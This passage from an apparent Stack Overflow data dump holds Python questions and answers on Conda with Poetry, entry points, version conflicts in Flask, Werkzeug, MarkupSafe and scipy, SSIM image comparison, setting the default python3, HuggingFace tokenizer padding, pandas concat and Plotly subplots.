","71110028","<p>I have experience with a Conda + Poetry setup, and it's been working fine. The great majority of my dependencies are specified in <code>pyproject.toml</code>, but when there's something that's unavailable in PyPI, or installing it with Conda is easier, I add it to <code>environment.yml</code>. Moreover, Conda is used as a virtual environment manager, which works well with Poetry: there is no need to use <code>poetry run</code> or <code>poetry shell</code>, it is enough to activate the right Conda environment.</p>
<h2>Tips for creating a reproducible environment</h2>
<ol>
<li>Add Poetry, possibly with a version number (if needed), as a dependency in <code>environment.yml</code>, so that you get Poetry installed when you run <code>conda create</code>, along with Python and other non-PyPI dependencies.</li>
<li>Add <code>conda-lock</code>, which gives you lock files for Conda dependencies, just like you have <code>poetry.lock</code> for Poetry dependencies.</li>
<li>Consider using <code>mamba</code> which is generally compatible with <code>conda</code>, but is better at resolving conflicts, and is also much faster. An additional benefit is that all users of your setup will use the same  package resolver, independent from the locally-installed version of Conda.</li>
<li>By default, use Poetry for adding Python dependencies. Install packages via Conda if there's a reason to do so (e.g. in order to get a CUDA-enabled version). In such a case, it is best to specify the package's exact version in <code>environment.yml</code>, and after it's installed, to add an entry with the same version specification to Poetry's <code>pyproject.toml</code> (without <code>^</code> or <code>~</code> before the version number). This will let Poetry know that the package is there and should not be upgraded.</li>
<li>If you use a different channels that provide the same packages, it might be not obvious which channel a particular package will be downloaded from. One solution is to specify the channel for the package using the :: notation (see the <code>pytorch</code> entry below), and another solution is to enable <a href=""https://docs.conda.io/projects/conda/en/latest/user-guide/tasks/manage-channels.html#strict"" rel=""noreferrer"">strict channel priority</a>. Unfortunately, in Conda 4.x there is no way to enable this option through <code>environment.yml</code>.</li>
<li>Note that Python adds <a href=""https://docs.python.org/3/library/site.html#site.USER_SITE"" rel=""noreferrer"">user site-packages</a> to <code>sys.path</code>, which may cause lack of reproducibility if the user has installed Python packages outside Conda environments. One possible solution is to make sure that the <a href=""https://docs.python.org/3/using/cmdline.html#envvar-PYTHONNOUSERSITE"" rel=""noreferrer""><code>PYTHONNOUSERSITE</code></a> environment variable is set to <code>True</code> (or to any other non-empty value).</li>
</ol>
<h2>Example</h2>
<p><code>environment.yml</code>:</p>
<pre><code>name: my_project_env
channels:
  - pytorch
  - conda-forge
  # We want to have a reproducible setup, so we don't want default channels,
  # which may be different for different users. All required channels should
  # be listed explicitly here.
  - nodefaults
dependencies:
  - python=3.10.*  # or don't specify the version and use the latest stable Python
  - mamba
  - pip  # pip must be mentioned explicitly, or conda-lock will fail
  - poetry=1.*  # or 1.1.*, or no version at all -- as you want
  - tensorflow=2.8.0
  - pytorch::pytorch=1.11.0
  - pytorch::torchaudio=0.11.0
  - pytorch::torchvision=0.12.0

# Non-standard section listing target platforms for conda-lock:
platforms:
  - linux-64
</code></pre>
<p><code>virtual-packages.yml</code> (may be used e.g. when we want <code>conda-lock</code> to generate CUDA-enabled lock files even on platforms without CUDA):</p>
<pre><code>subdirs:
  linux-64:
    packages:
      __cuda: 11.5
</code></pre>
<h3>First-time setup</h3>
<p>You can avoid playing with the bootstrap env and simplify the example below if you have <code>conda-lock</code>, <code>mamba</code> and <code>poetry</code> already installed outside your target environment.</p>
<pre><code># Create a bootstrap env
conda create -p /tmp/bootstrap -c conda-forge mamba conda-lock poetry='1.*'
conda activate /tmp/bootstrap

# Create Conda lock file(s) from environment.yml
conda-lock -k explicit --conda mamba
# Set up Poetry
poetry init --python=~3.10  # version spec should match the one from environment.yml
# Fix package versions installed by Conda to prevent upgrades
poetry add --lock tensorflow=2.8.0 torch=1.11.0 torchaudio=0.11.0 torchvision=0.12.0
# Add conda-lock (and other packages, as needed) to pyproject.toml and poetry.lock
poetry add --lock conda-lock

# Remove the bootstrap env
conda deactivate
rm -rf /tmp/bootstrap

# Add Conda spec and lock files
git add environment.yml virtual-packages.yml conda-linux-64.lock
# Add Poetry spec and lock files
git add pyproject.toml poetry.lock
git commit
</code></pre>
<h3>Usage</h3>
<p>The above setup may seem complex, but it can be used in a fairly simple way.</p>
<h4>Creating the environment</h4>
<pre><code>conda create --name my_project_env --file conda-linux-64.lock
conda activate my_project_env
poetry install
</code></pre>
<h4>Activating the environment</h4>
<pre><code>conda activate my_project_env
</code></pre>
<h4>Updating the environment</h4>
<pre><code># Re-generate Conda lock file(s) based on environment.yml
conda-lock -k explicit --conda mamba
# Update Conda packages based on re-generated lock file
mamba update --file conda-linux-64.lock
# Update Poetry packages and re-generate poetry.lock
poetry update
</code></pre>
"
"71191907","1","""No module named x.__main__; 'x' is a package and cannot be directly executed"" when using entry_points / console_scripts","<p>I have <a href=""https://github.com/Antrikshy/Rackfocus"" rel=""noreferrer"">this CLI tool</a> called Rackfocus. I've published to PyPI, and I'm reasonably sure it worked just fine before. When I try to run it with current versions of Python on Mac, I get the error:</p>
<pre><code>No module named rackfocus.__main__; 'rackfocus' is a package
and cannot be directly executed
</code></pre>
<p>All I want is one package with one entry point that users can download and use using pip.</p>
<p>Based on tutorials, I have this in <a href=""https://github.com/Antrikshy/Rackfocus/blob/master/setup.py"" rel=""noreferrer"">setup.py</a>:</p>
<pre><code>packages=['rackfocus']
entry_points = {
    'console_scripts': [
        'rackfocus=rackfocus.run:main'
    ]
}
</code></pre>
<p>And I have a <code>rackfocus.run:main</code> function, an <strong>init</strong>.py and everything.  What's wrong?</p>
<p>You can reproduce this locally:</p>
<ol>
<li>Clone my repo.</li>
<li>Create and activate a virtualenv (optional).</li>
<li><code>pip3 install -e .</code></li>
<li><code>python3 -m rackfocus</code></li>
</ol>
","71192123","<pre><code>entry_points = {
    'console_scripts': [
        'rackfocus=rackfocus.run:main'
    ]
}
</code></pre>
<p>This tells the packaging system to <em>create a wrapper executable</em> named <code>rackfocus</code>. That executable will automatically handle all the necessary steps to get Python off the ground, find the <code>run</code> module in the <code>rackfocus</code> package, find its <code>main</code> function and call it.</p>
<p>You run the executable like <code>rackfocus</code> (if you are using a virtual environment, it should be on the path already), not <code>python -m rackfocus</code>.</p>
<p>Using <code>python -m rackfocus</code> is <em>completely unrelated to that</em> (it doesn't even have anything to do with packaging, and can easily be used with code that hasn't been installed yet). It doesn't use the wrapper; instead, it simply attempts to <em>execute the <code>rackfocus</code> module</em>. But in your case, <code>rackfocus</code> <em>isn't</em> a module; it's a package. The error message means exactly what it says.</p>
<p>You would want <code>python -m rackfocus.run</code> to execute the <code>run</code> module - but of course, that still doesn't actually call <code>main()</code> (just like it wouldn't with <code>python rackfocus/main.py</code> - though the <code>-m</code> approach <a href=""https://stackoverflow.com/questions/7610001/"">is more powerful</a>; in particular, it allows your relative imports to work).</p>
<p>The error message says <code>rackfocus.__main__</code> because you <a href=""https://stackoverflow.com/a/36320295"">can make a package runnable by giving it a <code>__main__</code> module</a>.</p>
"
"71189819","1","ImportError: cannot import name 'json' from itsdangerous","<p>I am trying to get a Flask and Docker application to work but when I try and run it using my <code>docker-compose up</code> command in my Visual Studio terminal, it gives me an ImportError called <code>ImportError: cannot import name 'json' from itsdangerous</code>. I have tried to look for possible solutions to this problem but as of right now there are not many on here or anywhere else. The only two solutions I could find are to change the current installation of MarkupSafe and itsdangerous to a higher version: <a href=""https://serverfault.com/questions/1094062/from-itsdangerous-import-json-as-json-importerror-cannot-import-name-json-fr"">https://serverfault.com/questions/1094062/from-itsdangerous-import-json-as-json-importerror-cannot-import-name-json-fr</a> and another one on GitHub that tells me to essentially change the MarkUpSafe and itsdangerous installation again <a href=""https://github.com/aws/aws-sam-cli/issues/3661"" rel=""noreferrer"">https://github.com/aws/aws-sam-cli/issues/3661</a>, I have also tried to make a virtual environment named <code>veganetworkscriptenv</code> to install the packages but that has also failed as well. I am currently using Flask 2.0.0 and Docker 5.0.0 and the error occurs on line eight in vegamain.py.</p>
<p>Here is the full ImportError that I get when I try and run the program:</p>
<pre><code>veganetworkscript-backend-1  | Traceback (most recent call last):
veganetworkscript-backend-1  |   File &quot;/app/vegamain.py&quot;, line 8, in &lt;module&gt;
veganetworkscript-backend-1  |     from flask import Flask
veganetworkscript-backend-1  |   File &quot;/usr/local/lib/python3.9/site-packages/flask/__init__.py&quot;, line 19, in &lt;module&gt;
veganetworkscript-backend-1  |     from . import json
veganetworkscript-backend-1  |   File &quot;/usr/local/lib/python3.9/site-packages/flask/json/__init__.py&quot;, line 15, in &lt;module&gt;
veganetworkscript-backend-1  |     from itsdangerous import json as _json
veganetworkscript-backend-1  | ImportError: cannot import name 'json' from 'itsdangerous' (/usr/local/lib/python3.9/site-packages/itsdangerous/__init__.py)
veganetworkscript-backend-1 exited with code 1
</code></pre>
<p>Here are my requirements.txt, vegamain.py, Dockerfile, and docker-compose.yml files:</p>
<p>requirements.txt:</p>
<pre><code>Flask==2.0.0
Flask-SQLAlchemy==2.4.4
SQLAlchemy==1.3.20
Flask-Migrate==2.5.3
Flask-Script==2.0.6
Flask-Cors==3.0.9
requests==2.25.0
mysqlclient==2.0.1
pika==1.1.0
wolframalpha==4.3.0
</code></pre>
<p>vegamain.py:</p>
<pre><code># Veganetwork (C) TetraSystemSolutions 2022
# all rights are reserved.  
# 
# Author: Trevor R. Blanchard Feb-19-2022-Jul-30-2022
#

# get our imports in order first
from flask import Flask # &lt;-- error occurs here!!!

# start the application through flask.
app = Flask(__name__)

# if set to true will return only a &quot;Hello World&quot; string.
Debug = True

# start a route to the index part of the app in flask.
@app.route('/')
def index():
    if (Debug == True):
        return 'Hello World!'
    else:
        pass

# start the flask app here ---&gt;
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0') 
</code></pre>
<p>Dockerfile:</p>
<pre><code>FROM python:3.9
ENV PYTHONUNBUFFERED 1
WORKDIR /app
COPY requirements.txt /app/requirements.txt
RUN pip install -r requirements.txt
COPY . /app
</code></pre>
<p>docker-compose.yml:</p>
<pre><code>version: '3.8'
services:
  backend:
    build:
      context: .
      dockerfile: Dockerfile
    command: 'python vegamain.py'
    ports:
      - 8004:5000
    volumes:
      - .:/app
    depends_on:
      - db

#  queue:
#    build:
#      context: .
#      dockerfile: Dockerfile
#    command: 'python -u consumer.py'
#    depends_on:
#      - db

  db:
    image: mysql:5.7.22
    restart: always
    environment:
      MYSQL_DATABASE: admin
      MYSQL_USER: root
      MYSQL_PASSWORD: root
      MYSQL_ROOT_PASSWORD: root
    volumes:
      - .dbdata:/var/lib/mysql
    ports:
      - 33069:3306
</code></pre>
<p>How exactly can I fix this code? thank you!</p>
","71219718","<p>I just put <code>itsdangerous==2.0.1</code> in my requirements.txt .Then updated my virtualenv using <code>pip install -r requirements.txt</code> and then <code>docker-compose up --build</code> . Now everything fine for me. Didnot upgrade the flask version.</p>
"
"71567315","1","How to get the SSIM comparison score between two images?","<p>I am trying to calculate the SSIM between corresponding images. For example, an image called 106.tif in the ground truth directory corresponds to a 'fake' generated image 106.jpg in the fake directory.</p>
<p>The ground truth directory absolute pathway is <code>/home/pr/pm/zh_pix2pix/datasets/mousebrain/test/B</code>
The fake directory absolute pathway is <code>/home/pr/pm/zh_pix2pix/output/fake_B</code></p>
<p>The images inside correspond to each other, like this:
<a href=""https://i.stack.imgur.com/Gfx4x.png"" rel=""nofollow noreferrer"">see image</a></p>
<p>There are thousands of these images I want to compare on a one-to-one basis. I <strong><strong>do not</strong></strong> want to compare SSIM of one image to many others. Both the corresponding ground truth and fake images have the same file name, but different extension (i.e. 106.tif and 106.jpg) and I only want to compare them to each other.</p>
<p>I am struggling to edit available scripts for SSIM comparison in this way. I want to use this one: <a href=""https://github.com/mostafaGwely/Structural-Similarity-Index-SSIM-/blob/master/ssim.py"" rel=""nofollow noreferrer"">https://github.com/mostafaGwely/Structural-Similarity-Index-SSIM-/blob/master/ssim.py</a> but other suggestions are welcome. The code is also shown below:</p>
<pre><code># Usage:
#
# python3 script.py --input original.png --output modified.png
# Based on: https://github.com/mostafaGwely/Structural-Similarity-Index-SSIM-

# 1. Import the necessary packages
#from skimage.measure import compare_ssim
from skimage.metrics import structural_similarity as ssim
import argparse
import imutils
import cv2

# 2. Construct the argument parse and parse the arguments
ap = argparse.ArgumentParser()
ap.add_argument(&quot;-f&quot;, &quot;--first&quot;, required=True, help=&quot;Directory of the image that will be compared&quot;)
ap.add_argument(&quot;-s&quot;, &quot;--second&quot;, required=True, help=&quot;Directory of the image that will be used to compare&quot;)
args = vars(ap.parse_args())

# 3. Load the two input images
imageA = cv2.imread(args[&quot;first&quot;])
imageB = cv2.imread(args[&quot;second&quot;])

# 4. Convert the images to grayscale
grayA = cv2.cvtColor(imageA, cv2.COLOR_BGR2GRAY)
grayB = cv2.cvtColor(imageB, cv2.COLOR_BGR2GRAY)

# 5. Compute the Structural Similarity Index (SSIM) between the two
#    images, ensuring that the difference image is returned
#(score, diff) = compare_ssim(grayA, grayB, full=True)
(score, diff) = ssim(grayA, grayB, full=True)
diff = (diff * 255).astype(&quot;uint8&quot;)

# 6. You can print only the score if you want
print(&quot;SSIM: {}&quot;.format(score))
</code></pre>
<p>The use of argparse currently limits me to just one image at a time, but I would ideally like to compare them using a loop across the ground truth and fake directories. Any advice would be appreciated.</p>
","71567872","<p>Here's a working example to compare one image to another. You can expand it to compare multiple at once. Two test input images with slight differences:</p>
<p><a href=""https://i.stack.imgur.com/7KXEM.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/7KXEM.jpg"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/FIucK.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/FIucK.jpg"" alt=""enter image description here"" /></a></p>
<p><strong>Results</strong></p>
<p>Highlighted differences</p>
<p><a href=""https://i.stack.imgur.com/MrXbi.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/MrXbi.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/1h6Mv.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/1h6Mv.png"" alt=""enter image description here"" /></a></p>
<p>Similarity score</p>
<blockquote>
<p>Image similarity 0.9639027981846681</p>
</blockquote>
<p>Difference masks</p>
<p><a href=""https://i.stack.imgur.com/3VfD0.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/3VfD0.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/a6nRj.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/a6nRj.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/3BR8N.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/3BR8N.png"" alt=""enter image description here"" /></a></p>
<p>Code</p>
<pre><code>from skimage.metrics import structural_similarity
import cv2
import numpy as np

before = cv2.imread('5.jpg')
after = cv2.imread('6.jpg')

# Convert images to grayscale
before_gray = cv2.cvtColor(before, cv2.COLOR_BGR2GRAY)
after_gray = cv2.cvtColor(after, cv2.COLOR_BGR2GRAY)

# Compute SSIM between two images
(score, diff) = structural_similarity(before_gray, after_gray, full=True)
print(&quot;Image similarity&quot;, score)

# The diff image contains the actual image differences between the two images
# and is represented as a floating point data type in the range [0,1] 
# so we must convert the array to 8-bit unsigned integers in the range
# [0,255] before we can use it with OpenCV
diff = (diff * 255).astype(&quot;uint8&quot;)

# Threshold the difference image, followed by finding contours to
# obtain the regions of the two input images that differ
thresh = cv2.threshold(diff, 0, 255, cv2.THRESH_BINARY_INV | cv2.THRESH_OTSU)[1]
contours = cv2.findContours(thresh.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
contours = contours[0] if len(contours) == 2 else contours[1]

mask = np.zeros(before.shape, dtype='uint8')
filled_after = after.copy()

for c in contours:
    area = cv2.contourArea(c)
    if area &gt; 40:
        x,y,w,h = cv2.boundingRect(c)
        cv2.rectangle(before, (x, y), (x + w, y + h), (36,255,12), 2)
        cv2.rectangle(after, (x, y), (x + w, y + h), (36,255,12), 2)
        cv2.drawContours(mask, [c], 0, (0,255,0), -1)
        cv2.drawContours(filled_after, [c], 0, (0,255,0), -1)

cv2.imshow('before', before)
cv2.imshow('after', after)
cv2.imshow('diff',diff)
cv2.imshow('mask',mask)
cv2.imshow('filled after',filled_after)
cv2.waitKey(0)
</code></pre>
"
"71034111","1","How to set default python3 to python 3.9 instead of python 3.8 in Ubuntu 20.04 LTS","<p>I have installed Python 3.9 in the Ubuntu 20.04 LTS. Now the system has both Python 3.8 and Python 3.9.</p>
<pre><code># which python
# which python3
/usr/bin/python3
# which python3.8
/usr/bin/python3.8
# which python3.9
/usr/bin/python3.9
# ls -alith /usr/bin/python3
12583916 lrwxrwxrwx 1 root root 9 Jul 19  2021 /usr/bin/python3 -&gt; python3.8
</code></pre>
<p>But the <code>pip3</code> command will still install everything into the Python 3.8 directory.</p>
<pre><code># pip3 install --upgrade --find-links file:///path/to/directory &lt;...&gt;
</code></pre>
<p>I want to change that default pip3 behavior by updating the symbolic link /usr/bin/python3 to /usr/bin/python3.9.</p>
<p>How to do that?</p>
<pre><code># update-alternatives --set python3 /usr/bin/python3.9
This command will not work as expected.
</code></pre>
<p><strong>Here is the pip3 info:</strong></p>
<pre><code># which pip3
/usr/bin/pip3
# ls -alith /usr/bin/pip3
12589712 -rwxr-xr-x 1 root root 367 Jul 13  2021 /usr/bin/pip3
# pip3 -V
pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8)
# 
</code></pre>
<p>The <code>alias</code> command will not work:</p>
<pre><code># alias python3=python3.9
# ls -alith /usr/bin/python3
12583916 lrwxrwxrwx 1 root root 9 Jul 19  2021 /usr/bin/python3 -&gt; python3.8
</code></pre>
","71034427","<p>You should be able to use <code>python3.9 -m pip install &lt;package&gt;</code> to run pip with a specific python version, in this case 3.9.</p>
<p>The full docs on this are here: <a href=""https://packaging.python.org/guides/installing-using-pip-and-virtual-environments/"" rel=""noreferrer"">https://packaging.python.org/guides/installing-using-pip-and-virtual-environments/</a></p>
<p>If you want python3 to point to python3.9 you could use the quick and dirty.</p>
<pre><code>alias python3=python3.9
</code></pre>
<p>EDIT:</p>
<p>Tried to recreate your problem,</p>
<pre><code># which python3
/usr/bin/python3
# python3 --version
Python 3.8.10
# which python3.8
/usr/bin/python3.8
# which python3.9
/usr/bin/python3.9
</code></pre>
<p>Then update the alternatives, and set new priority:</p>
<pre><code># sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.9 1
# sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.9 2
# sudo update-alternatives --config python3
There are 2 choices for the alternative python3 (providing /usr/bin/python3).

  Selection    Path                Priority   Status
------------------------------------------------------------
  0            /usr/bin/python3.9   2         auto mode
  1            /usr/bin/python3.8   2         manual mode
* 2            /usr/bin/python3.9   2         manual mode

Press &lt;enter&gt; to keep the current choice[*], or type selection number: 0
</code></pre>
<p>Check new version:</p>
<pre><code># ls -alith /usr/bin/python3
3338 lrwxrwxrwx 1 root root 25 Feb  8 14:33 /usr/bin/python3 -&gt; /etc/alternatives/python3
# python3 -V
Python 3.9.5
# ls -alith /usr/bin/pip3
48482 -rwxr-xr-x 1 root root 367 Jul 13  2021 /usr/bin/pip3
# pip3 -V
pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.9)
</code></pre>
<p>Hope this helps (tried it in wsl2 Ubuntu 20.04 LTS)</p>
"
"71166789","1","HuggingFace: ValueError: expected sequence of length 165 at dim 1 (got 128)","<p>I am trying to fine-tune the BERT language model on my own data. I've gone through their docs, but their tasks seem to be not quite what I need, since my end goal is embedding text. Here's my code:</p>
<pre><code>from datasets import load_dataset
from transformers import BertTokenizerFast, AutoModel, TrainingArguments, Trainer
import glob
import os


base_path = '../data/'
model_name = 'bert-base-uncased'
max_length = 512
checkpoints_dir = 'checkpoints'

tokenizer = BertTokenizerFast.from_pretrained(model_name, do_lower_case=True)


def tokenize_function(examples):
    return tokenizer(examples['text'], padding=True, truncation=True, max_length=max_length)


dataset = load_dataset('text',
        data_files={
            'train': f'{base_path}train.txt',
            'test': f'{base_path}test.txt',
            'validation': f'{base_path}valid.txt'
        }
)

print('Tokenizing data. This may take a while...')
tokenized_dataset = dataset.map(tokenize_function, batched=True)
train_dataset = tokenized_dataset['train']
eval_dataset = tokenized_dataset['test']

model = AutoModel.from_pretrained(model_name)

training_args = TrainingArguments(checkpoints_dir)

print('Training the model...')
trainer = Trainer(model=model, args=training_args, train_dataset=train_dataset, eval_dataset=eval_dataset)
trainer.train()
</code></pre>
<p>I get the following error:</p>
<pre><code>  File &quot;train_lm_hf.py&quot;, line 44, in &lt;module&gt;
    trainer.train()
...
  File &quot;/opt/conda/lib/python3.7/site-packages/transformers/data/data_collator.py&quot;, line 130, in torch_default_data_collator
    batch[k] = torch.tensor([f[k] for f in features])
ValueError: expected sequence of length 165 at dim 1 (got 128)
</code></pre>
<p>What am I doing wrong?</p>
","71232059","<p>I fixed this solution by changing the tokenize function to:</p>
<pre><code>def tokenize_function(examples):
    return tokenizer(examples['text'], padding='max_length', truncation=True, max_length=max_length)
</code></pre>
<p>(note the <code>padding</code> argument). Also, I used a data collator like so:</p>
<pre><code>data_collator = DataCollatorForLanguageModeling(
    tokenizer=tokenizer, mlm=True, mlm_probability=0.15
)
trainer = Trainer(
        model=model,
        args=training_args,
        data_collator=data_collator,
        train_dataset=train_dataset,
        eval_dataset=eval_dataset
)
</code></pre>
"
"71544953","1","unreadable Jupyter Lab Notebook after upgrading pandas (Capture Validation Error)","<p>I was recently using Jupyter lab and decided to update my pandas version from 1.2 to the latest (1.4).  So I ran 'conda update pandas' which seemed to work fine.  However when I then launched Jupyter lab in the usual way 'jupyter lab' and tried to open the workbook I had just been working on I got the below error:</p>
<blockquote>
<p>Unreadable Notebook: C:\Users...\script.ipynb TypeError(&quot;<strong>init</strong>() got an unexpected keyword argument 'capture_validation_error'&quot;)</p>
</blockquote>
<p>I am getting this same error when trying to open any of my .ipynb files that were previously working fine.  I can also open them fine in jupyter notebook, but for some reason they don't work in Jupyter lab anymore.  Any idea how I can fix this?</p>
<p>Thanks</p>
","71595097","<p>It turns out that a recent update to <code>jupyter_server&gt;=1.15.0</code> broke compatibility with <code>nbformat&lt;5.2.0</code>, but did not update the <code>conda</code> recipe correctly per <a href=""https://github.com/conda-forge/jupyter_server-feedstock/pull/84"" rel=""noreferrer"">this Github pull request</a>.</p>
<p>It is possible that while updating <code>pandas</code>, you may have inadvertently also updated <code>jupyterlab</code> and/or <code>jupyter_server</code>.</p>
<p>While we wait for the build with the merged PR to come downstream, we can fix this dependency issue by updating <code>nbformat</code> manually with</p>
<pre><code>conda install -c conda-forge nbformat
</code></pre>
<p>to get the newest version of <code>nbformat</code> with version <code>&gt;=5.2</code>.</p>
"
"71078751","1","VS Code Python Formatting: Change max line-length with autopep8 / yapf / black","<p>I am experimenting with different python formatters and would like to increase the max line length. Ideally without editing the <code>settings.json</code> file. Is there a way to achieve that?
<a href=""https://i.stack.imgur.com/a1Nax.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/a1Nax.png"" alt=""select formatter"" /></a></p>
","71078792","<p>For all three formatters, the max line length can be increased with additional arguments passed in from settings, i.e.:</p>
<ul>
<li>autopep8 args: <code>--max-line-length=120</code></li>
<li>black args: <code>--line-length=120</code></li>
<li>yapf args: <code>--style={based_on_style: google, column_limit: 120, indent_width: 4}</code></li>
</ul>
<p>Hope that helps someone in the future!</p>
<p><a href=""https://i.stack.imgur.com/kUR66.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/kUR66.png"" alt=""enter image description here"" /></a></p>
"
"71132469","1","Appending row to dataframe with concat()","<p>I have defined an empty data frame with</p>
<pre><code>df = pd.DataFrame(columns=['Name', 'Weight', 'Sample'])
</code></pre>
<p>and want to append rows in a for loop like this:</p>
<pre><code>for key in my_dict:
   ...
   row = {'Name':key, 'Weight':wg, 'Sample':sm}
   df = pd.concat(row, axis=1, ignore_index=True) 
</code></pre>
<p>But I get this error</p>
<pre><code>cannot concatenate object of type '&lt;class 'str'&gt;'; only Series and DataFrame objs are valid
</code></pre>
<p>If I use <code>df = df.append(row, ignore_index=True)</code>, it works but it seems that <code>append</code> is deprecated. So, I want to use <code>concat()</code>. How can I fix that?</p>
","71132587","<p>You can transform your dict in pandas DataFrame</p>
<pre><code>import pandas as pd
df = pd.DataFrame(columns=['Name', 'Weight', 'Sample'])
for key in my_dict:
  ...
  #transform your dic in DataFrame
  new_df = pd.DataFrame([row])
  df = pd.concat([df, new_df], axis=0, ignore_index=True)
</code></pre>
"
"71271759","1","How to change MarkUpSafe version in virtual environment?","<p>I am trying to make an application using python and gRPC as shown in this article - <a href=""https://realpython.com/python-microservices-grpc/"" rel=""noreferrer"">link</a></p>
<p>I am able to run the app successfully on my terminal but to run with a frontend I need to run it as a flask app, <a href=""https://github.com/realpython/materials/tree/master/python-microservices-with-grpc"" rel=""noreferrer"">codebase</a>. And I am doing all this in a virtual environment.</p>
<p>when I run my flask command <code>FLASK_APP=marketplace.py flask run</code></p>
<p>This is the error I get</p>
<pre><code>ImportError: cannot import name 'soft_unicode' from 'markupsafe' (/Users/alex/Desktop/coding/virt/lib/python3.8/site-packages/markupsafe/__init__.py)
</code></pre>
<p>On researching about this error I found this <a href=""https://github.com/aws/aws-sam-cli/issues/3661"" rel=""noreferrer"">link</a> - it basically tells us that currently I am using a higher version of MarkUpSafe library than required.</p>
<p>So I did <code>pip freeze --local </code> inside the virtualenv and got MarkUpSafe version to be <code>MarkupSafe==2.1.0</code></p>
<p>I think if I change the version of this library from 2.1.0 to 2.0.1 then the flask app might run.</p>
<p>How can I change this library's version from the terminal?</p>
<p>PS: If you think changing the version of the library won't help in running the flask app, please let me know what else can I try in this.</p>
","71274080","<p>If downgrading will solve the issue for you try the following code inside your virtual environment.</p>
<p><code>pip install MarkupSafe==2.0.1</code></p>
"
"71106940","1","Cannot import name '_centered' from 'scipy.signal.signaltools'","<p>Unable to import functions from scipy module.</p>
<p>Gives error :</p>
<pre><code>from scipy.signal.signaltools import _centered
Cannot import name '_centered' from 'scipy.signal.signaltools'

scipy.__version__
1.8.0
</code></pre>
","71285979","<p>If you need to use that specific version of statsmodels 0.12.x with scipy 1.8.0 I have the following <em>hack</em>.
Basically it just re-publishes the existing (but private) _centered function as a public attribute to the module already imported in RAM.</p>
<p>It is a workaround, and if you can simply upgrade your dependencies to the latest versions. Only use this if you are forced to use those specific versions.</p>
<pre><code>import  scipy.signal.signaltools

def _centered(arr, newsize):
    # Return the center newsize portion of the array.
    newsize = np.asarray(newsize)
    currsize = np.array(arr.shape)
    startind = (currsize - newsize) // 2
    endind = startind + newsize
    myslice = [slice(startind[k], endind[k]) for k in range(len(endind))]
    return arr[tuple(myslice)]

scipy.signal.signaltools._centered = _centered
</code></pre>
"
"71652965","1","ImportError: cannot import name 'safe_str_cmp' from 'werkzeug.security'","<p>Any ideas on why I get this error?</p>
<p>My project was working fine. I copied it to an external drive and onto my laptop to work on the road; it worked fine. I copied it back to my desktop and had a load of issues with invalid interpreters etc, so I made a new project and copied just the scripts in, made a new requirements.txt and installed all the packages, but when I run it, I get this error:</p>
<pre><code>Traceback (most recent call last):
  File &quot;E:\Dev\spot_new\flask_blog\run.py&quot;, line 1, in &lt;module&gt;
    from flaskblog import app
  File &quot;E:\Dev\spot_new\flask_blog\flaskblog\__init__.py&quot;, line 3, in &lt;module&gt;
    from flask_bcrypt import Bcrypt
  File &quot;E:\Dev\spot_new\venv\lib\site-packages\flask_bcrypt.py&quot;, line 21, in &lt;module&gt;
    from werkzeug.security import safe_str_cmp
ImportError: cannot import name 'safe_str_cmp' from 'werkzeug.security' (E:\Dev\spot_new\venv\lib\site-packages\werkzeug\security.py)
</code></pre>
<p>I've tried uninstalling Python, Anaconda, PyCharm, deleting every reg key and environment variable I can find that looks pythonic, reinstalling all from scratch but still no dice.</p>
","71653849","<p>Werkzeug released <a href=""https://werkzeug.palletsprojects.com/en/2.1.x/changes/#version-2-1-0"" rel=""noreferrer"">v2.1.0</a> today, removing <code>werkzeug.security.safe_str_cmp</code>.</p>
<p>You can probably resolve this issue by pinning <code>Werkzeug~=2.0.0</code> in your requirements.txt file (or similar).</p>
<pre><code>pip install Werkzeug~=2.0.0
</code></pre>
<p>After that it is likely that you will also have an AttributeError related to the jinja package, so if you have it, also run:</p>
<pre><code>pip install jinja2~=3.0.3
</code></pre>
"
"71121056","1","Plotly Python update figure with dropMenu","<p>i am currently working with plotly i have a function called plotChart that takes a dataframe as input and plots a candlestick chart. I am trying to figure out a way to pass a list of dataframes  to the function plotChart and use a plotly dropdown menu to show the options on the input list by the stock name. The drop down menu will have the list of dataframe and when an option is clicked on it will update the figure in plotly is there away to do this. below is the code i have to plot a single dataframe</p>
<pre><code>def make_multi_plot(df):
    
    fig = make_subplots(rows=2, cols=2,
                        shared_xaxes=True,
                        vertical_spacing=0.03,
                        subplot_titles=('OHLC', 'Volume Profile'),
                        row_width=[0.2, 0.7])

    for s in df.name.unique():
        
        trace1 = go.Candlestick(
            x=df.loc[df.name.isin([s])].time,
            open=df.loc[df.name.isin([s])].open,
            high=df.loc[df.name.isin([s])].high,
            low=df.loc[df.name.isin([s])].low,
            close=df.loc[df.name.isin([s])].close,
            name = s)
        fig.append_trace(trace1,1,1)
        
        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].BbandsMid, mode='lines',name='MidBollinger'),1,1)
        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].BbandsUpp, mode='lines',name='UpperBollinger'),1,1)
        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].BbandsLow, mode='lines',name='LowerBollinger'),1,1)
        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].vwap, mode='lines',name='VWAP'),1,1)
